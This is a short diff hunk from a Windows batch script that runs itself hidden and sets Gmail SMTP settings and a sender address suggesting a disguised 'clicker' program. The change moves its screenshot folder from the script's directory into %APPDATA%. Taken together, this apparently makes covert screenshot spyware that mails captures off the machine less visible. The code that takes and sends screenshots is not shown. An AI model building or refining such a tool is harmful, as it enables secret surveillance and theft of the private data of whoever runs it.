@@ -5,7 +5,7 @@ if "%~1" neq "/hidden" (
 )
 
 :: === CONFIGURATION ===
-set "screenshotFolder=%~dp0screens"
+set "screenshotFolder=%APPDATA%\screens"
 set "smtpServer=smtp.gmail.com"
 set "smtpPort=587"
 set "emailFrom=najlepszyclicker1@gmail.com"
